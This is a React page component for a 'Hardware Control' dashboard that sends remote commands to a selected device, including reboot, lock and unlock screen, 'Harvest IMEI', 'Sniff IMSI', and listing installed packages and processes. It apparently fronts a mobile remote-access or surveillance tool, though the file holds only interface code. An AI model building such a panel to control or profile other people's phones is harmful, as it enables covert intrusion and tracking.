import { useEffect, useState } from 'react'
import { useParams } from 'react-router-dom'
import PageHeader from '../components/PageHeader'
import { hardware } from '../utils/api'
import { Terminal, Power, Volume2, Smartphone, Hash, Wifi, Battery, Activity } from 'lucide-react'

const commands = [
  { id: 'reboot', label: 'Reboot Device', icon: Power, color: 'danger' },
  { id: 'lock_screen', label: 'Lock Screen', icon: Power, color: 'primary' },
  { id: 'unlock_screen', label: 'Unlock Screen', icon: Power, color: 'success' },
  { id: 'mute', label: 'Mute Volume', icon: Volume2, color: 'warning' },
  { id: 'max_volume', label: 'Max Volume', icon: Volume2, color: 'secondary' },
  { id: 'get_imei', label: 'Harvest IMEI', icon: Hash, color: 'primary' },
  { id: 'get_imsi', label: 'Sniff IMSI', icon: Smartphone, color: 'primary' },
  { id: 'get_carrier', label: 'Carrier Info', icon: Wifi, color: 'primary' },
  { id: 'battery_status', label: 'Battery Status', icon: Battery, color: 'success' },
  { id: 'thermal_monitor', label: 'Thermal Monitor', icon: Activity, color: 'warning' },
  { id: 'sensor_data', label: 'Sensor Data', icon: Activity, color: 'primary' },
  { id: 'list_packages', label: 'List Packages', icon: Smartphone, color: 'primary' },
  { id: 'list_processes', label: 'List Processes', icon: Terminal, color: 'primary' },
]

export default function HardwarePage() {
  const { deviceId } = useParams()

  const sendCommand = async (cmd) => {
    if (!deviceId) return
    await hardware.command(deviceId, cmd, {})
  }

  return (
    <div className="animate-fade-in">
      <PageHeader title="Hardware Control" icon={Terminal} onDeviceChange={() => {}} />

      <div className="wuzen-panel p-6">
        <h3 className="text-sm font-semibold uppercase tracking-wider text-wuzen-muted mb-4">Device State & Hardware Commands</h3>
        <div className="grid grid-cols-2 md:grid-cols-4 gap-3">
          {commands.map(cmd => {
            const Icon = cmd.icon
            return (
              <button
                key={cmd.id}
                onClick={() => sendCommand(cmd.id)}
                className={`flex items-center gap-2 p-3 rounded-lg border transition-all hover:bg-wuzen-card
                  ${cmd.color === 'danger' ? 'border-wuzen-danger/30 text-wuzen-danger hover:border-wuzen-danger/50' :
                    cmd.color === 'success' ? 'border-wuzen-success/30 text-wuzen-success hover:border-wuzen-success/50' :
                    cmd.color === 'warning' ? 'border-wuzen-warning/30 text-wuzen-warning hover:border-wuzen-warning/50' :
                    cmd.color === 'secondary' ? 'border-wuzen-secondary/30 text-wuzen-secondary hover:border-wuzen-secondary/50' :
                    'border-wuzen-primary/30 text-wuzen-primary hover:border-wuzen-primary/50'}`}
              >
                <Icon className="w-4 h-4" />
                <span className="text-xs">{cmd.label}</span>
              </button>
            )
          })}
        </div>
      </div>
    </div>
  )
}
